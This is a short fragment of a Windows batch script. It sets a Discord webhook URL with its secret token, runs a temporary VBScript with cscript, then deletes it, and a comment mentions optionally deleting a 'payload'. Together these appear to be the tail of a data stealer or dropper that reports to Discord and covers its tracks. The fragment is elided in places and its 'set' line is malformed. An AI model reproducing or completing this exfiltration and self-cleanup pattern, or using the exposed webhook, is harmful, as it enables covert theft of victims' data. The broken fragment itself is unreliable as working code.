...
:: --------------------------------------
set "https://discord.com/api/webhooks/1367992952881680511/knLxmhVtqQEOnNei_V1gHaMTAXqvsBR5cdHdhIrAAHXsG5__5-BVvwZxBqFH3l9DOlZK"
...
cscript //nologo "%vbs%"
del "%vbs%"
:: Optionally also delete the payload if you want
:: del "%payload%"
exit
